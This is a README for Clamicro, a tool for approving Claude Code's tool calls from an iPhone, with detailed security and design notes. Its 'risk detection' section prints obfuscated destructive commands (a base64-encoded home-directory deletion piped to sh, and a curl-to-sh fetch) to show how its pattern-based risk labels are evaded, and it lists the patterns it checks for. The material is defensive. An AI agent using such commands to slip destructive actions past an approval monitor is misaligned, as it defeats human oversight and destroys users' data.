# Clamicro

[中文](./README.zh-CN.md)

Watch Claude Code from your phone, and approve what it wants to run.

Stop babysitting the terminal. When Claude Code needs permission, your Mac notifies you; open the page on your phone, read the command and a one-line summary, swipe to approve or reject — Claude Code continues immediately.

<p align="center">
  <img src="https://raw.githubusercontent.com/laosji/clamicro/main/docs/images/notch.png" width="620" alt="A notification capsule rendered at the Mac's notch: a green check badge, the project name, and the result line">
</p>

| Running | Something needs you | The decision |
|:--:|:--:|:--:|
| <img src="https://raw.githubusercontent.com/laosji/clamicro/main/docs/images/home-running.png" width="230" alt="Home screen while Claude Code is working: a breathing status console and a scrolling list of recent tool calls"> | <img src="https://raw.githubusercontent.com/laosji/clamicro/main/docs/images/home-pending.png" width="230" alt="Home screen with a pending approval at the top and a second one listed below"> | <img src="https://raw.githubusercontent.com/laosji/clamicro/main/docs/images/approval-detail.png" width="230" alt="Approval detail: risk level, impact, the command in full, and a drag-to-decide bar pinned to the bottom"> |

*The screenshots are the real UI, not mockups. The notch capsule is a screen capture from a Mac.*

**Be clear on the defaults before you assume it gates everything:**

| | Waits | Then | Notifies you |
|---|---|---|---|
| Ordinary operations | 10s | **auto-approve** | yes |
| High-risk (`rm -rf`, force push, anything touching `~/.ssh`) | 3 min | **auto-deny** | yes |

So out of the box it *tells you* about routine work and *stops* dangerous work. Both the wait and the timeout behaviour are adjustable in settings — set the 10s to 0 and every operation waits for you; the 3 minutes can go up to 570s (beyond that you hit the hook's own system timeout and the approval stops working at all).

**Zero dependencies.** Node ≥ 18 and `curl` (built into macOS). Nothing in `node_modules` at runtime.

`qrencode` is optional: with it, pairing shows a QR code you scan with the camera; without it, the same pairing URL is shown as text for you to type. Nothing breaks either way.

```bash
brew install qrencode
```

> macOS + iPhone only. The service uses macOS-specific facilities (`scutil`, `osascript`, Bonjour) and the UI is built for iOS Safari.

---

## Install

```bash
npx clamicro install
```

Three steps:

1. **In the terminal** — checks your environment, shows exactly what it will change in `~/.claude/settings.json`, waits for your confirmation, backs up and writes, asks whether to trust the current network, starts the service, and prints **a URL** (not a QR code — see below).
2. **Open that URL on your phone**, on the same Wi-Fi. You get a pairing page. Tap "Show QR on the Mac"; the QR appears **on the Mac's screen only**. Scan it with your phone's camera.
3. **Confirm on the Mac.** A dialog asks whether to let this device in, and shows where the request came from. Nothing is issued until you press Allow.

Then walk through the built-in demo: it creates a fake approval so you can swipe one for real before anything real is at stake. That round-trip *is* the acceptance test.

> **Why a URL and not a QR code in the terminal?** A QR in the terminal has to carry a credential,
> and a terminal is a place things get *kept* — scrollback, screen recordings, screen sharing, the
> phone camera of whoever is sitting next to you. Earlier versions printed a permanent master token
> there; the version after that printed a 60-second pairing ticket, which was safe but usually
> **expired before you got your phone out**. A URL carries nothing and never expires. The credential
> is minted only after you tap the button, and it only ever appears on the Mac's screen.

It works immediately after install: when approval is needed your Mac shows a notification and plays a sound, the terminal status line shows `⏳ N pending`, and the web UI is reachable from your phone.

**No remote push:** the only alert channel is a macOS local notification — fully offline. Nothing will reach you once you walk away from the Mac; high-risk operations sit until they time out and get rejected. See "Near-field means Wi-Fi only" below.

> The installer **appends, never replaces.** Your existing hook config is preserved intact; if `statusLine` is already taken by another tool it's left alone with a warning. Everything is backed up first.

Uninstall:

```bash
npx clamicro uninstall
```

Removes only what it added — verified byte-for-byte identical to the pre-install config. Config and history stay in `~/.claude/clamicro/` for you to delete manually.

### Where the runtime lives

The npm package is **just an installer**. Runtime files are copied to `~/.claude/clamicro/app/`, and hooks point there.

This isn't busywork. Hooks store absolute paths, but `npx` runs from a cache directory that changes, and global install paths move with your node version / nvm / homebrew. Pointing hooks at the package means that one day the path breaks and **every hook fails silently** — no error, you simply stop being notified. Verified: delete `node_modules` and the service and hooks keep working.

To upgrade, run `npx clamicro install` again.

---

## What you get

| On your phone | Source |
|---|---|
| Session state and sub-state (Thinking / Searching / Editing) | hook event stream |
| 5-hour and 7-day usage, context window, session cost | `statusLine` |
| Pending approvals with a plain-English summary and impact tags | `PermissionRequest` |
| Task finished / errored alerts | `Stop` / `StopFailure` |
| Full event timeline per session | all hooks |
| Pause / Resume / Cancel the current turn | `PreToolUse` gate |
| Quota-nearly-exhausted warning | `statusLine` |

> This table describes **Claude Code**. With another backend attached, what you can do
> depends on that backend — see "More than Claude Code" below.

---

## More than Claude Code

Since 2.14.0 one dashboard can watch several backends at once. Today that means
Claude Code and [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (DSH).

The home screen **groups by model**: each model gets a heading with its own status,
recent activity and usage. The order is fixed by which backend connected first, so
cards don't jump around when one of them gets busy.

**Pending approvals are never grouped** — they stay at the top, across all backends.
They run on a countdown; putting one inside a section means you have to find that
section before you can see it, and a missed approval is a silent automatic decision.

### Backends differ in what they can do

|  | Claude Code | DeepSeek Harness |
|---|:--:|:--:|
| Approve from phone | ✓ | ✓ |
| Pause / Resume | ✓ | — |
| Cancel the turn | ✓ | — (protocol supports it, not wired yet) |
| Send a message from the phone | ✓ | — (protocol supports it, not wired yet) |
| Usage | 5h / 7d rolling window | cumulative tokens |

The UI **renders by capability**: an action a backend can't do gets no entry point at
all. A button that does nothing when tapped is worse than no button — you assume the
pause worked and walk away.

DSH usage is reported in tokens, never converted to money: DSH doesn't compute cost,
and converting needs a per-model price table that would go stale without anyone
noticing, quietly showing you a wrong number.

### Attaching DSH

Needs a bridge plugin, **not shipped inside the clamicro npm package** — see
[`plugins/`](./plugins/). There's also an optional pixel cat that sits on the DSH web
UI; tapping it opens the phone dashboard (or the pairing QR if you haven't paired yet).

### Gestures

Swipe left to reject, right to approve — on both the detail page and the home list. Approvals get a 3-second undo window.

High-risk operations (`rm -rf`, `git push --force`, key and credential files, writes outside the working directory) need a longer swipe on the detail page, and **can't be approved by swiping in the list at all**. The list is for fast triage; letting something dangerous through should require opening it and looking.

### What "pause" actually means

Claude Code has no runtime-freeze primitive — nothing can stop it mid-step. "Pause" **holds it at the next tool call**; the step currently running finishes first. The UI says so explicitly, so you don't think the button did nothing. Cancel works the same way, returning `{continue: false}` at the next gate.

### The approval path

```
Claude Code wants to run something that needs permission
  → PermissionRequest hook (HTTP, timeout 600)
  → service records it, your Mac notifies you, then it blocks
  → you approve or reject on your phone
  → hook returns the decision → Claude Code proceeds or is denied
```

---

## Security

This tool hands Claude Code's execution permissions to your phone, so the boundaries are worth stating plainly.

### Network trust gate

The service is exposed on your LAN only on networks **you've explicitly trusted**. On an unfamiliar network (café, airport, hotel) it binds to loopback only — your phone can't reach it — and your Mac tells you why.

```bash
npx clamicro networks   # current network + trusted list
npx clamicro trust      # trust the current network
npx clamicro untrust    # revoke — current network by default, or untrust <id-prefix> / untrust all
```

Trust is **revocable.** Trusting a network by mistake (tapping "yes" at a café) shouldn't be permanent — otherwise that network stays on the list forever and re-exposes you the next time you connect.

The fingerprint combines **gateway IP + gateway MAC + subnet + SSID + DHCP server + search domain + DNS list**.

The first three are not enough: SSID needs Location permission on recent macOS and simply does not exist on Ethernet, and `00:00:5e:00:01:xx` is a VRRP virtual MAC that is *not* unique across enterprise networks. A real collision was reproduced — two different companies both on `192.168.1.0/24`, both with gateway `192.168.1.1`, both behind VRRP, neither exposing an SSID: all four fields identical, so **once you trusted company A, company B's network counted as trusted**. The last three signals come from DHCP, need no permission, and are almost never all identical across organisations.

### Implemented protections

| Protection | What it stops |
|---|---|
| **Host header allowlist** | DNS rebinding. A malicious site rebinds its domain to your LAN IP; the browser treats it as same-origin, CORS is bypassed entirely, and it can read your dashboard and command text and approve operations — **without ever being on your Wi-Fi** |
| **hooks / statusLine / pair-new are local-only** | Anyone on your subnet forging hook events: spamming approval notifications, injecting fake timeline entries, faking quota readings — and, more seriously, minting themselves a pairing ticket. "Local" here means three things at once: loopback source **and** a loopback `Host` **and** no proxy headers. Source address alone is not enough: with a Cloudflare tunnel running, public traffic arrives from `127.0.0.1` |
| **Mac-side confirmation on pairing** | Someone who merely *saw* the QR — over screen sharing, a projector, the phone camera of the person next to you, or the tunnel URL — getting a device token. Seeing the code is no longer enough; someone has to be sitting at the Mac and press Allow. Any failure of that dialog (timeout, no GUI session, a crash) counts as a **denial** |
| **`/api/pair` requires a custom header** | CSRF. Cross-site "simple requests" are sent by the browser regardless — the side effect already happened — meaning any site you visit could make your Mac pop up a QR code |
| **CSP `frame-ancestors 'none'`** | Clickjacking: a malicious page framing the approval screen and tricking you into swiping |
| **Constant-time comparison** | Timing side channels on the token and per-approval keys |
| **`SameSite=Lax` + `HttpOnly`** | CSRF, while still keeping you logged in when arriving from another app (`Strict` would force a re-scan every time) |
| **Per-approval key** | A leaked deep link can only decide that one approval, and stops working 2 minutes after it settles (that short grace exists because the result page re-fetches with it right after you tap) |
| **Nothing credential-shaped in the terminal** | The installer prints a plain URL. It carries no token and never expires, so scrollback, screen recordings and shoulder-surfing get you nothing. The credential is minted only after you tap the button on the phone, and only ever renders on the Mac's screen |

### Risk detection is a hint, not a sandbox

The risk levels in this tool come from **pattern matching over the command text** —
`rm -rf`, force pushes, paths under `~/.ssh`, writes outside the working directory.
They exist to *pull your attention* to the operations most likely to hurt. They do
not contain anything, and they are trivially defeated:

```bash
echo cm0gLXJmIH4v | base64 -d | sh    # the dangerous string never appears
D=$HOME; rm -rf "$D"                   # indirection through a variable
curl https://example.com/x.sh | sh     # the payload isn't in the command at all
./cleanup.sh                           # it's in a file we never see
```

Nothing here runs in a sandbox. When you approve an operation, it executes with your
full user privileges — Clamicro only decides *whether* the tool call proceeds, never
*what it can reach*.

Two consequences worth internalizing:

- **"Normal" doesn't mean safe.** It means no rule matched. A command that reads
  perfectly innocuous can still delete your work.
- **The protection is you reading the command**, not the label above it. The label
  decides how much friction you get (high-risk needs a longer swipe and can't be
  approved from the list) — that friction is calibrated by a heuristic, so it is
  a nudge, not a guarantee.

If you need actual containment, that is a different tool: a VM, a container, or
Claude Code's own permission rules restricting which tools may run at all.

### In plain terms: a paired phone is a key to your Mac

**A device token grants permission to approve anything** — `rm -rf`, `sudo`, reading your `~/.ssh/id_rsa`. Treat a paired phone like a key:

- The QR itself is no longer sufficient on its own: it is one-time, expires in 60 seconds, and pairing
  additionally requires pressing **Allow** in a dialog on the Mac. Someone who photographs the code
  still cannot pair without you. That said, don't leave it on screen — belt and braces
- If you suspect it leaked, rotate immediately: `npx clamicro rotate-token`. Every logged-in device is
  signed out at once and takes effect on the running service immediately — no restart needed. You will
  need to pair your phone again. To revoke just one device, use `npx clamicro forget <id>` instead
- The login cookie expires after 30 days; scan again then

### The remaining risk: plaintext HTTP

LAN traffic is unencrypted. **A passive sniffer on the same network can capture your token** and gain full control, including approving `rm -rf`. Command text is equally exposed.

There's no fix that preserves the scan-and-go experience — a self-signed certificate makes Safari throw warnings and breaks the flow. The network trust gate downgrades this from "remember not to use it at a café" to "it doesn't work there by default." But if you genuinely need this on an untrusted network:

**Use Tailscale.** WireGuard end-to-end encryption, no third party ever sees plaintext, and it isn't limited to one Wi-Fi. The service detects `100.64/10` addresses and binds to them automatically, **bypassing the trust gate** — an encrypted overlay doesn't care what physical network it sits on.

The other route is a tunnel (`clamicro tunnel on`), but tunneling services terminate TLS and can technically read your command text — so it's an escape hatch, not a default.

---

## Near-field means Wi-Fi only

The control plane **never leaves your LAN**. Command text, approval decisions, timeline and quota all go straight to `http://<host>.local:8765`.

Two tiers based on where you are — neither reaches outside:

| Situation | How you're alerted | Network reach |
|---|---|---|
| **① At your Mac** | macOS notification + sound | **fully offline** |
| **② Away from the Mac** | **no alert** | — |

**Why ② has no alert:** lock-screen-capable notifications must go through APNs, which necessarily means a third-party server.

Two channels were tried and both removed: an ntfy relay with action buttons (approve straight from the lock screen — that hands the *control plane* to a third party), and Bark (one line saying "there's an approval", control plane staying on the LAN). The latter was about as restrained as it gets, and it still only bought "something can page you while you're away" — but this tool assumes you're nearby to begin with. Continuously telling an outside server that an operation is waiting for approval isn't worth that.

**Be clear about the cost:** once you leave the Mac, *nothing* alerts you. High-risk operations wait out the timeout (3 minutes by default) and get auto-rejected, failing that turn. That is the intended default — nobody should be approving `rm -rf` while away. You can still open the dashboard from your phone whenever you want to look.
---

## Design notes

**Hooks must respond before pushing.** `async: true` only works for `command` hooks; HTTP hooks always block for the response. So every endpoint returns `{}` immediately and pushes afterwards.

**Self-timeout capped at 570 seconds.** Never let it reach the system's 600s timeout — that's treated as a non-blocking error and falls through to the normal permission flow, leaving the terminal hanging on a prompt nobody is looking at.

**Five terminal states:** `allowed` / `auto_allowed` / `denied` / `expired` / `abandoned`. When the same approval is decided from multiple places, first write wins and later ones get the real current state instead of an error.

**`Stop` push threshold.** `Stop` fires at the end of *every* assistant turn, including two-second exchanges. Only turns ≥ 30s notify by default. When the turn's start time is unknown (service started mid-session) it notifies anyway — better one extra ping than a missed completion.

**Operations that will auto-approve don't notify at all.** Your phone buzzes, you pull it out, unlock — the 10 seconds are long gone. That notification is pure noise; the operation was pre-authorized and shouldn't interrupt anyone.

**The status line is rendered server-side.** `bin/statusline.sh` doesn't parse JSON — it POSTs the payload and gets rendered text back. No `jq` dependency, and no ~115ms Node startup cost (measured: 15ms). It shows `⏳ N pending` when approvals are waiting.

**Sub-states are derived, not events.** Claude Code has no Thinking/Searching/Editing events; they're inferred from `PreToolUse.tool_name`, with the gap between `PostToolUse` and the next `PreToolUse` treated as Thinking.

**A dead service never blocks Claude Code.** A refused loopback connection is instant; the hook gets a non-blocking error and proceeds. And `SessionStart` is a `command` hook that starts the service before forwarding — opening Claude Code means the service is up.

**The address is a Bonjour hostname, not an IP.** macOS already broadcasts `<LocalHostName>.local`; using it means old links survive DHCP changes and you never re-scan. If your router blocks multicast, set the address mode to IP in Settings.

**The login cookie must be `SameSite=Lax`, not `Strict`.** Arriving from another app (a saved link, the QR shown on the Mac) is a cross-site navigation; `Strict` cookies aren't sent, so every notification tap would look like a fresh login.

**Quota is account-level, not per-session.** Storing it per session lets a stale session's numbers override the newest reading. Only the latest observation counts, and the UI shows when it was taken and from which session.

**Approvals and events are persisted** to `~/.claude/clamicro/history.json` — debounced writes, atomic rename. Anything still pending at restart becomes `abandoned`: those hook connections are long gone, and showing them as "waiting" would be a lie.

**Hooks hot-reload; statusLine doesn't.** Hook changes take effect in the current session; statusLine needs a new one.

**Revocation is immediate — no restart.** `forget` / `rotate-token` / `untrust` are separate CLI processes that only touch the config file, while the service read that file once at startup. So before 2.14.0 all three were **no-ops until you restarted** — yet `forget` printed "those devices are signed out immediately". The service now watches the config file and hot-reloads the token, device book and trusted networks, which makes that sentence true.

**Config and `settings.json` are written atomically** — temp file in the same directory, then rename. Two paths actually hit the non-atomic version: the hot-reload watcher reading half-written JSON, and a process interrupted mid-write leaving the file permanently truncated (a half `config.json` means the token and every paired device are gone; a half `settings.json` means Claude Code won't start). Permissions are set before the rename, so there is no window where the file is in place but still `0644`.

**Nothing gets killed without an identity check.** Both `stop` and the installer kill whatever listens on the port — and 8765 is not reserved. The check is `service: 'clamicro'` from `/healthz` (returned only to loopback, so a LAN scanner never sees it), not command-line matching, whose shape isn't stable. A foreign process is reported, never taken over.

**Risk assessment doesn't look at the tool name.** It triggers on "does the input carry a `command`". It used to be `toolName === 'Bash'` — and DSH names its tool lowercase `bash`, so exact matching made the entire high-risk ruleset **never run**: `rm -rf /` scored as ordinary and auto-approved after 10s. One letter of difference, and the safety core fails silently with no error.

---

## Commands

```bash
npx clamicro install      # install / upgrade
npx clamicro uninstall    # uninstall
npx clamicro qr           # print the login QR code
npx clamicro status       # service, network, version
npx clamicro config       # every effective setting, labelled by where it came from
npx clamicro trust        # trust the current network
npx clamicro untrust      # revoke trust (untrust <id-prefix> | untrust all)
npx clamicro networks     # current network + trusted list
npx clamicro rotate-token # issue a new access token (if it may have leaked)
npx clamicro test-push    # send a test notification (local, on the Mac)
npx clamicro logs         # tail the log
npx clamicro stop         # stop the service
```

You don't normally start it by hand — the `SessionStart` hook brings the service up when you open Claude Code.

Config lives at `~/.claude/clamicro/config.json` (mode 600, contains the token and push credentials). Day-to-day settings are editable from the phone UI; you shouldn't need to touch this file.

`ignoreCwds` lists working directories that skip blocking approval — useful when developing clamicro itself, and should be empty otherwise.

---

## Known limitations

- Requires the same Wi-Fi as your Mac (or the same tailnet); corporate networks with client isolation or VLAN separation won't work
- LAN traffic is plaintext — use Tailscale on untrusted networks, see [Security](#security)
- Plain HTTP isn't a secure context, so no Service Worker or Web Push
- macOS + iPhone only
- Pause means "stop at the next interceptable point", not a runtime freeze
- Risk levels are pattern matching, not containment — see [Risk detection is a hint, not a sandbox](#risk-detection-is-a-hint-not-a-sandbox)
- The interface is gesture-first; there's currently no equivalent path for VoiceOver users
- History keeps one day, capped at 300 approvals / 3000 events, oldest dropped

---

## Guide

A walkthrough covering first run, the three usage scenarios, how to read the approval screen, and troubleshooting: [docs/guide.md](./docs/guide.md) · [中文](./docs/guide.zh-CN.md)

---

## Notes

Maintainer notes — mistakes made and why decisions were taken the way they were: [NOTES.md](./NOTES.md) (Chinese).

---

## License

MIT
